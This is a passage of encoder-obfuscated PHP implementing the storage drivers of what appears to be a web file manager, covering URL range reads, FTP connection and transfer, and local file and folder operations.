isset($GLOBALS[$­Ğïîë…[1523]]) ? $GLOBALS[$­Ğïîë…[1523]] : !1; $GLOBALS[$­Ğïîë…[1523]] = !0; self::$_cacheHeader[$íé×—½Ô] = url_header($íé×—½Ô); $GLOBALS[$­Ğïîë…[1523]] = $Ë†íá…¦; return self::$_cacheHeader[$íé×—½Ô]; } public function hashSimple($“ıÈî˜±, $çıİ¼¯‚ = false) { $ì›ïÍü• =& $_SERVER[ï»»·÷á]; $Â¯ï¾½ç = $this->info($“ıÈî˜±); if (!$Â¯ï¾½ç || !$Â¯ï¾½ç[$ì›ïÍü•[202]]) { return !1; } $¡ÉÏ¿œÇ = $Â¯ï¾½ç[$ì›ïÍü•[76]]; $¶‘­ÒÚ… = 200; $¹¥‚µ± = 50; if ($¡ÉÏ¿œÇ <= $¶‘­ÒÚ… * $¹¥‚µ±) { return md5($this->fileSubstr($“ıÈî˜±, 0, $¡ÉÏ¿œÇ)) . $¡ÉÏ¿œÇ; } $–ø¦¤ˆ = intval($¡ÉÏ¿œÇ / $¹¥‚µ±); $µÀ×¾È = $ì›ïÍü•[12]; $«‚ÉöËã = timeFloat(); $©³×Ø¢â = 15; for ($ÛÊ©ùğÍ = 0; $ÛÊ©ùğÍ < $¹¥‚µ±; $ÛÊ©ùğÍ++) { if (timeFloat() - $«‚ÉöËã > $©³×Ø¢â) { return !1; } $–ûí‡’ = $this->fileSubstr($“ıÈî˜±, $–ø¦¤ˆ * $ÛÊ©ùğÍ, $¶‘­ÒÚ…); if (!$–ûí‡’) { return !1; } $µÀ×¾È .= $–ûí‡’; } $µÀ×¾È .= $this->fileSubstr($“ıÈî˜±, $¡ÉÏ¿œÇ - $¶‘­ÒÚ…, $¶‘­ÒÚ…); return md5($µÀ×¾È) . $¡ÉÏ¿œÇ; } public function getContent($Ÿ¨Îàë–) { return $this->fileSubstr($Ÿ¨Îàë–); } public function fileSubstr($É¶É¶ˆÜ, $×Å›É” = 0, $¥ğ¢‹ş = -1) { $€Œˆñ‰œ =& $_SERVER[ï»»·÷á]; $ˆÔ¢¦·ó = $this->info($É¶É¶ˆÜ); if (!$ˆÔ¢¦·ó || !$ˆÔ¢¦·ó[$€Œˆñ‰œ[202]] && $ˆÔ¢¦·ó[$€Œˆñ‰œ[76]] > 1024 * 1024 * 10) { return !1; } if ($¥ğ¢‹ş === -1) { $¥ğ¢‹ş = $ˆÔ¢¦·ó[$€Œˆñ‰œ[76]]; } if ($¥ğ¢‹ş == 0) { return $€Œˆñ‰œ[12]; } $‹™ı”¢Í = array($€Œˆñ‰œ[1524] . $×Å›É” . $€Œˆñ‰œ[795] . ($×Å›É” + $¥ğ¢‹ş - 1)); $Ş—µäà– = url_request($É¶É¶ˆÜ, $€Œˆñ‰œ[230], !1, $‹™ı”¢Í, !1, !1, 30); return $Ş—µäà–[$€Œˆñ‰œ[1212]] ? $Ş—µäà–[$€Œˆñ‰œ[1212]] : $€Œˆñ‰œ[12]; } public function download($³Ïşš, $Ó®·ïŸï) { Downloader::start($³Ïşš, $Ó®·ïŸï); return $Ó®·ïŸï; } } goto bç…¸µìÃÈ; CÂŠˆô¹†¼: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($¡ìøºÅ) { parent::__construct(); if (count($¡ìøºÅ) > 0) { $this->_init($¡ìøºÅ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¹©ÀÇÛÙ) { $½¡ú…°€ =& $_SERVER[ï»»·÷á]; global $config; $this->appCharset = $config[$½¡ú…°€[1386]]; $this->systemCharset = $config[$½¡ú…°€[1387]]; if (isset($¹©ÀÇÛÙ[$½¡ú…°€[1388]]) && $¹©ÀÇÛÙ[$½¡ú…°€[1388]]) { $this->systemCharset = $¹©ÀÇÛÙ[$½¡ú…°€[1388]]; } } public function iconvApp($¯ŸóÔ¦è) { return $this->iconvTo($¯ŸóÔ¦è, $this->systemCharset, $this->appCharset); } public function iconvSystem($òç×³ƒí) { return $this->iconvTo($òç×³ƒí, $this->appCharset, $this->systemCharset); } public function getPathOuter($ßœë”§) { $¬ß˜”şõ =& $_SERVER[ï»»·÷á]; $¸¢×ü÷ª = $this->iconvApp($this->pathBase); $ßœë”§ = $this->iconvApp($ßœë”§); if (substr($¸¢×ü÷ª, 0, 2) == $¬ß˜”şõ[1389]) { $¸¢×ü÷ª = BASIC_PATH . substr($¸¢×ü÷ª, 2); } if (substr($ßœë”§, 0, 2) == $¬ß˜”şõ[1389]) { $ßœë”§ = BASIC_PATH . substr($ßœë”§, 2); } $¸¢×ü÷ª = KodIO::clear($¸¢×ü÷ª); $ßœë”§ = KodIO::clear($ßœë”§); $ßœë”§ = substr($ßœë”§, strlen($¸¢×ü÷ª)); if (empty($this->pathDriver)) { return $ßœë”§; } return $this->pathDriver . $¬ß˜”şõ[8] . ltrim($ßœë”§, $¬ß˜”şõ[8]); } private function _init($¸“›È”µ = array()) { $šèúÆµ· =& $_SERVER[ï»»·÷á]; if (!function_exists($šèúÆµ·[1390])) { throw new Exception(LNG($šèúÆµ·[1391])); } $this->config = $¸“›È”µ; $this->charsetReset($¸“›È”µ); foreach ($¸“›È”µ as $»’¡§â => $†íê½ Ø) { if (isset($this->{$»’¡§â})) { $this->{$»’¡§â} = $†íê½ Ø; } } return $this->_login($¸“›È”µ); } private function _login($ı÷’Ã¦¾) { $¤ì“ÀÒá =& $_SERVER[ï»»·÷á]; static $÷Àç²¨‰ = array(); $ŠÖëı€ = md5(json_encode($ı÷’Ã¦¾)); if (isset($÷Àç²¨‰[$ŠÖëı€])) { foreach ($÷Àç²¨‰[$ŠÖëı€] as $¤›ôöüÛ => $‹¡ÈñË) { $this->{$¤›ôöüÛ} = $‹¡ÈñË; } return !0; } $Å½’İ¦ = parse_url(trim($this->server, $¤ì“ÀÒá[8])); $this->host = $Å½’İ¦[$¤ì“ÀÒá[182]]; $İ´¬ÒÖ = isset($Å½’İ¦[$¤ì“ÀÒá[181]]) && $Å½’İ¦[$¤ì“ÀÒá[181]] == $¤ì“ÀÒá[1392] ? !0 : !1; $this->scheme = $İ´¬ÒÖ ? $¤ì“ÀÒá[1393] : $¤ì“ÀÒá[1394]; $this->port = isset($Å½’İ¦[$¤ì“ÀÒá[183]]) ? $Å½’İ¦[$¤ì“ÀÒá[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ÒÀ¾ó©÷ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Ó¥åõ¬Á = $this->pasv == $¤ì“ÀÒá[88] ? !0 : !1; @ftp_pasv($this->connect, $Ó¥åõ¬Á); $÷Àç²¨‰[$ŠÖëı€] = array($¤ì“ÀÒá[1395] => $this->connect, $¤ì“ÀÒá[182] => $this->host, $¤ì“ÀÒá[181] => $this->scheme, $¤ì“ÀÒá[183] => $this->port); return $ÒÀ¾ó©÷; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($¬Ã£áÇ, $ƒàÙ×ıÑ = '', $²ş†·˜Ç = REPEAT_RENAME) { if ($this->setContent($¬Ã£áÇ, $ƒàÙ×ıÑ)) { return $this->getPathOuter($¬Ã£áÇ); } return !1; } public function mkdir($½†µ€Šˆ, $€¢Ÿƒ˜ò = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $½†µ€Šˆ = $this->iconvSystem($½†µ€Šˆ); if ($this->_isFolder($½†µ€Šˆ) || @ftp_mkdir($this->connect, $½†µ€Šˆ)) { return $this->getPathOuter($½†µ€Šˆ); } if (!$this->mkdir($this->pathFather($½†µ€Šˆ))) { return !1; } if ($½†µ€Šˆ = @ftp_mkdir($this->connect, $½†µ€Šˆ)) { return $this->getPathOuter($½†µ€Šˆ); } return !1; } public function copyFile($Èê­ù‹Å, $ï­ßî‹½) { if (!$this->_isconn()) { return !1; } $•Ñå¡“å = $this->pathThis($this->iconvSystem($Èê­ù‹Å)); $ÔÊ•”ÍÙ = $this->tempFile($•Ñå¡“å); $ÈÖá’±ˆ = $this->iconvApp($ÔÊ•”ÍÙ); $this->download($Èê­ù‹Å, $ÈÖá’±ˆ); $…åâƒ€¬ = $this->upload($ï­ßî‹½, $ÈÖá’±ˆ); $this->tempFileRemve($ÔÊ•”ÍÙ); return $…åâƒ€¬; } public function moveFile($ÖíğŠêš, $…ø™¥ã) { if (!$this->_isconn()) { return !1; } $ÖíğŠêš = $this->iconvSystem($ÖíğŠêš); $…ø™¥ã = $this->iconvSystem($…ø™¥ã); $µ©â»ÅÑ = @ftp_rename($this->connect, $ÖíğŠêš, $…ø™¥ã); return $µ©â»ÅÑ ? $this->getPathOuter($…ø™¥ã) : !1; } public function delFile($’”ü ÍÒ) { if (!$this->_isconn()) { return !1; } $’”ü ÍÒ = $this->iconvSystem($’”ü ÍÒ); return @ftp_delete($this->connect, $’”ü ÍÒ); } public function delFolder($¨ÛÑ‘ªÀ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $àÎ¼¦“¥ = $êÔÃáÎï = array(); $this->fileList($¨ÛÑ‘ªÀ, $àÎ¼¦“¥, $êÔÃáÎï, !0); $this->listItemCache = !0; foreach ($êÔÃáÎï as $ °åĞéå) { $úêĞµ¤¢ = $this->iconvSystem($ °åĞéå[$_SERVER[ï»»·÷á][32]]); $ÆÓœ´ê“ = @ftp_delete($this->connect, $úêĞµ¤¢); if (!$ÆÓœ´ê“) { return !1; } } foreach ($àÎ¼¦“¥ as $úêĞµ¤¢) { $úêĞµ¤¢ = $this->iconvSystem($úêĞµ¤¢); $ÆÓœ´ê“ = @ftp_rmdir($this->connect, $úêĞµ¤¢); if (!$ÆÓœ´ê“) { return !1; } } $¨ÛÑ‘ªÀ = $this->iconvSystem($¨ÛÑ‘ªÀ); return @ftp_rmdir($this->connect, $¨ÛÑ‘ªÀ); } public function rename($Ö·«Úö•, $Š¶ªËÚ–) { $­İØäÔ =& $_SERVER[ï»»·÷á]; if (!$this->_isconn()) { return !1; } $—ŠŞ‘®ó = $this->fileNameAuto($this->pathFather($Ö·«Úö•), $Š¶ªËÚ–); $—ŠŞ‘®ó = $this->iconvSystem($—ŠŞ‘®ó); $Ö·«Úö• = $this->iconvSystem($Ö·«Úö•); $Ëüê¸Æ = $this->pathFather($Ö·«Úö•); $ÙÆºÄÒç = rtrim($Ëüê¸Æ, $­İØäÔ[8]) . $­İØäÔ[8] . $—ŠŞ‘®ó; $ãÍ¿Êö = @ftp_rename($this->connect, $Ö·«Úö•, $ÙÆºÄÒç); $ÙÆºÄÒç = $this->iconvApp($ÙÆºÄÒç); return $ãÍ¿Êö ? $this->getPathOuter($ÙÆºÄÒç) : !1; } private function folderInfo($ûÚí‘»¦, $ö¯ÈÔËÑ = false) { $ÀÑ³÷ú =& $_SERVER[ï»»·÷á]; $ùÜÉ”Ÿ‹ = array($ÀÑ³÷ú[32] => $this->pathThis($ûÚí‘»¦), $ÀÑ³÷ú[84] => $this->getPathOuter($ÀÑ³÷ú[8] . $ûÚí‘»¦), $ÀÑ³÷ú[33] => $ÀÑ³÷ú[75]); if ($ö¯ÈÔËÑ) { return $ùÜÉ”Ÿ‹; } $ùÜÉ”Ÿ‹[$ÀÑ³÷ú[201]] = $ùÜÉ”Ÿ‹[$ÀÑ³÷ú[85]] = 0; $ùÜÉ”Ÿ‹[$ÀÑ³÷ú[202]] = $ùÜÉ”Ÿ‹[$ÀÑ³÷ú[203]] = !0; return $ùÜÉ”Ÿ‹; } private function fileInfo($ğ¨ªáå, $ãª«§Ğì = false, $†¦Ü±¨ = array()) { $Öß±°ğ¯ =& $_SERVER[ï»»·÷á]; $ß£§» = array($Öß±°ğ¯[32] => $this->pathThis($ğ¨ªáå), $Öß±°ğ¯[84] => $this->getPathOuter($Öß±°ğ¯[8] . $ğ¨ªáå), $Öß±°ğ¯[33] => $Öß±°ğ¯[200], $Öß±°ğ¯[76] => isset($†¦Ü±¨[$Öß±°ğ¯[76]]) ? $†¦Ü±¨[$Öß±°ğ¯[76]] : 0, $Öß±°ğ¯[174] => $this->ext($ğ¨ªáå)); if ($ãª«§Ğì) { return $ß£§»; } $ß£§»[$Öß±°ğ¯[201]] = $ß£§»[$Öß±°ğ¯[85]] = 0; $ß£§»[$Öß±°ğ¯[202]] = $ß£§»[$Öß±°ğ¯[203]] = !0; $ã™õâÖß = $this->iconvSystem($ğ¨ªáå); $ß£§»[$Öß±°ğ¯[85]] = @ftp_mdtm($this->connect, $ã™õâÖß); if (empty($†¦Ü±¨)) { $†¦Ü±¨ = $this->objectMeta($ğ¨ªáå); if (!$†¦Ü±¨) { return $ß£§»; } } $ß£§»[$Öß±°ğ¯[76]] = $†¦Ü±¨[$Öß±°ğ¯[76]]; return $ß£§»; } public function size($Ë„…‘ï¨) { $æ¸µşÆ = $this->objectMeta($Ë„…‘ï¨); return $æ¸µşÆ ? $æ¸µşÆ[$_SERVER[ï»»·÷á][76]] : 0; } public function info($ òˆìø) { if ($this->isFile($ òˆìø)) { return $this->fileInfo($ òˆìø, 0); } else { if ($this->isFolder($ òˆìø)) { return $this->folderInfo($ òˆìø); } } return !1; } private function fileList($¸àâÅ¿ñ, &$³Ôğè¢, &$íÚ«À¹é, $ÖÅá¨¯ï = false) { $ù‰íí”ı =& $_SERVER[ï»»·÷á]; $¸àâÅ¿ñ = $this->iconvSystem($¸àâÅ¿ñ); if (!$this->isFolder($¸àâÅ¿ñ)) { return !1; } @ftp_chdir($this->connect, $ù‰íí”ı[8]); $¸àâÅ¿ñ = rtrim($¸àâÅ¿ñ, $ù‰íí”ı[8]) . $ù‰íí”ı[8]; check_abort(); $«ÓŞÀ¢ = @ftp_rawlist($this->connect, $¸àâÅ¿ñ); if (!$«ÓŞÀ¢) { $«ÓŞÀ¢ = array(); } $¦¼Ó¿ÇÉ = array($ù‰íí”ı[10] => 1, $ù‰íí”ı[1396] => 1); foreach ($«ÓŞÀ¢ as $Ñ–Ô½Ô¡) { $í¢öåæ´ = $this->_listItem($Ñ–Ô½Ô¡); if ($í¢öåæ´[0] == $ù‰íí”ı[771]) { continue; } $¢Ğ½äÉ† = $í¢öåæ´[8]; if (empty($¢Ğ½äÉ†) && $¢Ğ½äÉ† !== $ù‰íí”ı[198] || isset($¦¼Ó¿ÇÉ[$¢Ğ½äÉ†])) { continue; } $¢Ğ½äÉ† = $this->iconvApp($¸àâÅ¿ñ . ltrim($¢Ğ½äÉ†, $ù‰íí”ı[8])); $â‘»‹…¤ = array($ù‰íí”ı[32] => $¢Ğ½äÉ†, $ù‰íí”ı[33] => $ù‰íí”ı[200], $ù‰íí”ı[76] => $í¢öåæ´[4]); if (substr($Ñ–Ô½Ô¡, 0, 1) == $ù‰íí”ı[1397]) { $â‘»‹…¤[$ù‰íí”ı[33]] = $ù‰íí”ı[75]; $â‘»‹…¤[$ù‰íí”ı[76]] = 0; } $§÷“„½ = $â‘»‹…¤[$ù‰íí”ı[33]] == $ù‰íí”ı[75] ? !0 : !1; $this->cacheMethodInfoSet($¢Ğ½äÉ†, $§÷“„½, $â‘»‹…¤); if ($§÷“„½) { $³Ôğè¢[] = $¢Ğ½äÉ†; if ($ÖÅá¨¯ï) { $this->fileList($¢Ğ½äÉ†, $³Ôğè¢, $íÚ«À¹é, $ÖÅá¨¯ï); } continue; } $íÚ«À¹é[] = $â‘»‹…¤; } $this->cacheMethodInfoSet($¸àâÅ¿ñ, !0); } private function _listItem($Ï¦Ó·Ú†) { if (empty($Ï¦Ó·Ú†)) { return array(); } $À¤ïİœ¤ = preg_split($_SERVER[ï»»·÷á][1398], $Ï¦Ó·Ú†); if (count($À¤ïİœ¤) <= 9) { return $À¤ïİœ¤; } $À¤ïİœ¤[8] = trim(substr($Ï¦Ó·Ú†, strpos($Ï¦Ó·Ú†, $À¤ïİœ¤[7]) + strlen($À¤ïİœ¤[7]))); return array_splice($À¤ïİœ¤, 0, 9); } public function listPath($Ô®şï÷–, $¨›Ì¹ = false) { $’ïµİÄ =& $_SERVER[ï»»·÷á]; if (!$this->_isconn()) { return !1; } $‘±‚šµ = $‚øº“æò = array(); $this->fileList($Ô®şï÷–, $‘±‚šµ, $‚øº“æò); foreach ($‘±‚šµ as $•§‹Æ£× => $å¥Äµè) { $‘±‚šµ[$•§‹Æ£×] = $this->folderInfo($å¥Äµè, $¨›Ì¹); } foreach ($‚øº“æò as $•§‹Æ£× => $å¥Äµè) { $‚øº“æò[$•§‹Æ£×] = $this->fileInfo($å¥Äµè[$’ïµİÄ[32]], $¨›Ì¹, $å¥Äµè); } return array($’ïµİÄ[82] => $‘±‚šµ, $’ïµİÄ[83] => $‚øº“æò); } public function has($õŒÙ™†, $Ü‰¹½…Ğ = false, $Ú­—Î© = true) { $´Ğ§³À =& $_SERVER[ï»»·÷á]; $Å‡—˜ƒ› = $ƒ•”ŞÜÌ = array(); $¬ıÂ‚–å = $Ü‰¹½…Ğ ? !0 : !1; $this->fileList($õŒÙ™†, $Å‡—˜ƒ›, $ƒ•”ŞÜÌ, $¬ıÂ‚–å); if ($Ü‰¹½…Ğ) { return array($´Ğ§³À[207] => count($ƒ•”ŞÜÌ), $´Ğ§³À[208] => count($Å‡—˜ƒ›)); } if ($Ú­—Î©) { if (count($ƒ•”ŞÜÌ)) { return !0; } } else { if (count($Å‡—˜ƒ›)) { return !0; } } return !1; } public function listAll($´³ëˆí‡) { $êëÛ«âÍ =& $_SERVER[ï»»·÷á]; if (!$this->_isconn()) { return !1; } $—ÍÆ½¹È = $µÅÒ¡óÏ = array(); $this->fileList($´³ëˆí‡, $—ÍÆ½¹È, $µÅÒ¡óÏ, !0); $ë®êÕ¤ğ = array_to_keyvalue($µÅÒ¡óÏ, $êëÛ«âÍ[32]); foreach ($—ÍÆ½¹È as $Ñûø¸É) { if (is_string($Ñûø¸É)) { $ë®êÕ¤ğ[$Ñûø¸É] = array($êëÛ«âÍ[76] => 0); } } return $this->listAllFiles($´³ëˆí‡, $ë®êÕ¤ğ); } public function getContent($§¥–›‡á) { if (!$this->_isconn()) { return !1; } $§¥–›‡á = $this->iconvSystem($§¥–›‡á); return $this->fileSubstr($§¥–›‡á); } public function setContent($ò‡¢úÇú, $‚ÖİØÜá = '') { if (!$this->_isconn()) { return !1; } $½Ø“æ½ = $this->pathThis($this->iconvSystem($ò‡¢úÇú)); $óÄïà¹ = $this->tempFile($½Ø“æ½); file_put_contents($óÄïà¹, $‚ÖİØÜá); $ĞùÈ½¢Ñ = $this->upload($ò‡¢úÇú, $this->iconvApp($óÄïà¹)); $this->tempFileRemve($óÄïà¹); return $ĞùÈ½¢Ñ; } public function fileSubstr($²´Ø„’, $ î´åÛ¬ = 0, $ı—òÒé = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($²´Ø„’, $ î´åÛ¬, $ı—òÒé); } private function ftpRequest($Şƒõº¹¶, $ûÄ¯¼Æá = 0, $¢¬Ş››Ş = false) { $Şƒõº¹¶ = $this->iconvSystem($Şƒõº¹¶); $ÁÌ«Ø˜ú = $this->scheme . $this->host . $_SERVER[ï»»·÷á][4] . $this->port; $¨Ş³‚š× = curl_init(); curl_setopt($¨Ş³‚š×, CURLOPT_URL, $ÁÌ«Ø˜ú . $this->pathEncode($Şƒõº¹¶)); curl_setopt($¨Ş³‚š×, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¢¬Ş››Ş) { $¼Úìã§£ = $ûÄ¯¼Æá + $¢¬Ş››Ş - 1; curl_setopt($¨Ş³‚š×, CURLOPT_RANGE, "{$ûÄ¯¼Æá}\x2d{$¼Úìã§£}"); } curl_setopt($¨Ş³‚š×, CURLOPT_RETURNTRANSFER, 1); $Ü°ÒÄ–ñ = curl_exec($¨Ş³‚š×); curl_close($¨Ş³‚š×); return $Ü°ÒÄ–ñ; } public function upload($ÊÚ¡êÅ«, $ã Ò£¬£, $‰·½Á×Ç = false, $Öç®™Æ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ÊÚ¡êÅ«))) { return !1; } $ÊÚ¡êÅ« = $this->iconvSystem($ÊÚ¡êÅ«); $ã Ò£¬£ = $this->iconvSystem($ã Ò£¬£); $ˆ¿³ı = ftp_nb_put($this->connect, $ÊÚ¡êÅ«, $ã Ò£¬£, FTP_BINARY); while ($ˆ¿³ı == FTP_MOREDATA) { $ˆ¿³ı = ftp_nb_continue($this->connect); } if ($ˆ¿³ı != FTP_FINISHED) { return !1; } return $this->getPathOuter($ÊÚ¡êÅ«); } public function download($»òŞ‡£Ì, $‰¬Å­±“ = '') { if (!$this->_isconn()) { return !1; } $ÀõşÔŸ = $this->pathFather($‰¬Å­±“); if (!IO::mkdir($ÀõşÔŸ)) { return !1; } $»òŞ‡£Ì = $this->iconvSystem($»òŞ‡£Ì); $‰¬Å­±“ = $this->iconvSystem($‰¬Å­±“); $şÌ¤êÈ˜ = ftp_nb_get($this->connect, $‰¬Å­±“, $»òŞ‡£Ì, FTP_BINARY); while ($şÌ¤êÈ˜ == FTP_MOREDATA) { $şÌ¤êÈ˜ = ftp_nb_continue($this->connect); } if ($şÌ¤êÈ˜ != FTP_FINISHED) { return !1; } return $this->iconvApp($‰¬Å­±“); } public function exist($¼‡›„Î) { return $this->isFile($¼‡›„Î) || $this->isFolder($¼‡›„Î); } public function isFile($‹¢¤ƒ“µ) { return !$this->isFolder($‹¢¤ƒ“µ) && $this->objectMeta($‹¢¤ƒ“µ); } public function isFolder($‰¿ò Ÿİ) { return $this->cacheMethod($_SERVER[ï»»·÷á][165], $‰¿ò Ÿİ); } protected function objectMeta($‰Ü®ù—Õ) { return $this->cacheMethod($_SERVER[ï»»·÷á][167], $‰Ü®ù—Õ); } protected function _objectMeta($„¯¯ö›é) { $¹Ü¨ÉüÇ =& $_SERVER[ï»»·÷á]; if ($„¯¯ö›é == $¹Ü¨ÉüÇ[12] || $„¯¯ö›é == $¹Ü¨ÉüÇ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $„¯¯ö›é = $this->iconvSystem($„¯¯ö›é); $ÃŠ­ã‡ä = array($¹Ü¨ÉüÇ[32] => $this->iconvApp($„¯¯ö›é), $¹Ü¨ÉüÇ[33] => $¹Ü¨ÉüÇ[200], $¹Ü¨ÉüÇ[76] => 0); @ftp_chdir($this->connect, $¹Ü¨ÉüÇ[8]); $Ö±óçÈÇ = @ftp_size($this->connect, $„¯¯ö›é); if ($Ö±óçÈÇ != -1) { $ÃŠ­ã‡ä[$¹Ü¨ÉüÇ[76]] = $Ö±óçÈÇ; } else { $²ÕáĞ° = @ftp_chdir($this->connect, $„¯¯ö›é); if (!$²ÕáĞ°) { return !1; } $ÃŠ­ã‡ä[$¹Ü¨ÉüÇ[33]] = $¹Ü¨ÉüÇ[75]; } return $ÃŠ­ã‡ä; } protected function _isFolder($œ»×¨­Á) { $ßØçÍˆ =& $_SERVER[ï»»·÷á]; if ($œ»×¨­Á == $ßØçÍˆ[12] || $œ»×¨­Á == $ßØçÍˆ[8]) { return !0; } $€ûú†Íæ = $this->_objectMeta($œ»×¨­Á); return isset($€ûú†Íæ[$ßØçÍˆ[33]]) && $€ûú†Íæ[$ßØçÍˆ[33]] == $ßØçÍˆ[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÃÖñÓå) { if (substr($ÃÖñÓå, 0, 2) == $_SERVER[ï»»·÷á][1389]) { $ÃÖñÓå = BASIC_PATH . substr($ÃÖñÓå, 2); } return $ÃÖñÓå; } public function iconvApp($€šÂ›´—) { $şĞ´‹¹ò =& $_SERVER[ï»»·÷á]; global $config; return $this->iconvTo($€šÂ›´—, $config[$şĞ´‹¹ò[1387]], $config[$şĞ´‹¹ò[1386]]); } public function iconvSystem($×Œ€àÍ) { $Ù‡ïšş =& $_SERVER[ï»»·÷á]; global $config; return $this->iconvTo($×Œ€àÍ, $config[$Ù‡ïšş[1386]], $config[$Ù‡ïšş[1387]]); } public function getPathOuter($Ó‘í£ê) { $ÑîŒ¿‚Ï =& $_SERVER[ï»»·÷á]; $™ğ÷”’ƒ = $this->iconvApp($this->pathBase); $Ó‘í£ê = $this->iconvApp($Ó‘í£ê); if (substr($™ğ÷”’ƒ, 0, 2) == $ÑîŒ¿‚Ï[1389]) { $™ğ÷”’ƒ = BASIC_PATH . substr($™ğ÷”’ƒ, 2); } if (substr($Ó‘í£ê, 0, 2) == $ÑîŒ¿‚Ï[1389]) { $Ó‘í£ê = BASIC_PATH . substr($Ó‘í£ê, 2); } $™ğ÷”’ƒ = KodIO::clear($™ğ÷”’ƒ); $Ó‘í£ê = KodIO::clear($Ó‘í£ê); $Ó‘í£ê = substr($Ó‘í£ê, strlen($™ğ÷”’ƒ)); if (empty($this->pathDriver)) { return $Ó‘í£ê; } return $this->pathDriver . $ÑîŒ¿‚Ï[8] . ltrim($Ó‘í£ê, $ÑîŒ¿‚Ï[8]); } public function mkfile($í‹ìê·›, $Øşãú©¢ = '', $ØúàĞº = REPEAT_RENAME) { $í‹ìê·› = $this->iconvSystem($í‹ìê·›); @touch($í‹ìê·›); if ($Øşãú©¢) { file_put_contents($í‹ìê·›, $Øşãú©¢); } @chmod($í‹ìê·›, $this->pathAuth); return is_file($í‹ìê·›) ? $this->getPathOuter($í‹ìê·›) : !1; } public function mkdir($¦Ôà‹ß, $¶‡÷åş = REPEAT_SKIP) { $¦Ôà‹ß = $this->iconvSystem($¦Ôà‹ß); if (is_dir($¦Ôà‹ß)) { return $this->getPathOuter($¦Ôà‹ß); } @mkdir($¦Ôà‹ß, $this->pathAuth, !0); @chmod($¦Ôà‹ß, $this->pathAuth); return is_dir($¦Ôà‹ß) ? $this->getPathOuter($¦Ôà‹ß) : !1; } public function copyFile($ö¨Ü®, $µÒÜÁºò) { $this->mkdir($this->pathFather($µÒÜÁºò)); $ö¨Ü® = $this->iconvSystem($ö¨Ü®); $µÒÜÁºò = $this->iconvSystem($µÒÜÁºò); $¦âÙ„¾˜ = copy_64($ö¨Ü®, $µÒÜÁºò); @chmod($µÒÜÁºò, $this->pathAuth); return $¦âÙ„¾˜ ? $this->getPathOuter($µÒÜÁºò) : !1; } public function moveFile($•Óø’¿÷, $ÄÎ¶ÎÚ§) { $this->mkdir($this->pathFather($ÄÎ¶ÎÚ§)); $•Óø’¿÷ = $this->iconvSystem($•Óø’¿÷); $ÄÎ¶ÎÚ§ = $this->iconvSystem($ÄÎ¶ÎÚ§); $ÚôÑíË = intval(@rename($•Óø’¿÷, $ÄÎ¶ÎÚ§)); if (!$ÚôÑíË) { if ($ÚôÑíË = intval(@copy_64($•Óø’¿÷, $ÄÎ¶ÎÚ§))) { @unlink($•Óø’¿÷); } } @chmod($ÄÎ¶ÎÚ§, $this->pathAuth); return $ÚôÑíË ? $this->getPathOuter($ÄÎ¶ÎÚ§) : !1; } public function movePath($½ôÈÌ¢, $Ğ™óñëŞ, $¯Ââ¢©² = false) { $©Ç©ú…Æ =& $_SERVER[ï»»·÷á]; $½ôÈÌ¢ = $this->iconvSystem($½ôÈÌ¢); $Ğ™óñëŞ = $this->iconvSystem($Ğ™óñëŞ); $›öÙ›—Õ = rtrim($Ğ™óñëŞ, $©Ç©ú…Æ[8]) . $©Ç©ú…Æ[8] . ($¯Ââ¢©² ? $¯Ââ¢©² : get_path_this($½ôÈÌ¢)); if (file_exists($›öÙ›—Õ)) { return !1; } $Öš’¹±ï = intval(@rename($½ôÈÌ¢, $›öÙ›—Õ)); $Öš’¹±ï = file_exists($›öÙ›—Õ); return $Öš’¹±ï ? $this->getPathOuter($›öÙ›—Õ) : !1; } public function delFile($éâä’çÖ) { $éâä’çÖ = $this->iconvSystem($éâä’çÖ); if (!@unlink($éâä’çÖ)) { @chmod($éâä’çÖ, $this->pathAuth); if (!@unlink($éâä’çÖ)) { return !1; } } else { return !0; } } public function delFolder($ıÆºØñö) { $±úŞÇŸë =& $_SERVER[ï»»·÷á]; $ıÆºØñö = $this->iconvSystem($ıÆºØñö); if (!is_dir($ıÆºØñö)) { return !0; } if (!($›ŒÃü› = opendir($ıÆºØñö))) { return !1; } while (($°™º§µ = readdir($›ŒÃü›)) !== !1) { if ($°™º§µ == $±úŞÇŸë[10] || $°™º§µ == $±úŞÇŸë[1396]) { continue; } $ı¥´ »… = $ıÆºØñö . $±úŞÇŸë[8] . $°™º§µ; if (is_file($ı¥´ »…) || is_link($ı¥´ »…)) { if (!unlink($ı¥´ »…)) { chmod($ı¥´ »…, $this->pathAuth); if (!unlink($ı¥´ »…)) { return !1; } } } else { if (is_dir($ı¥´ »…)) { chmod($ı¥´ »…, $this->pathAuth); $ı¥´ »… = $this->iconvApp($ı¥´ »…); if (!$this->delFolder($ı¥´ »…)) { return !1; } } } } closedir($›ŒÃü›); return rmdir($ıÆºØñö); } public function rename($•ÅÅœÄ, $¶†Ú×‡ä) { $˜¾ÃÓĞ— =& $_SERVER[ï»»·÷á]; $ÏñºóÙ = $this->fileNameAuto($this->pathFather($•ÅÅœÄ), $¶†Ú×‡ä); $ÏñºóÙ = $this->iconvSystem($ÏñºóÙ); $•ÅÅœÄ = $this->iconvSystem($•ÅÅœÄ); $¢±×™è¢ = $this->pathFather($•ÅÅœÄ); $™Õ óò¦ = rtrim($¢±×™è¢, $˜¾ÃÓĞ—[8]) . $˜¾ÃÓĞ—[8] . $ÏñºóÙ; $¦éÖ—ü¨ = @rename($•ÅÅœÄ, $™Õ óò¦); $™Õ óò¦ = $this->iconvApp($™Õ óò¦); 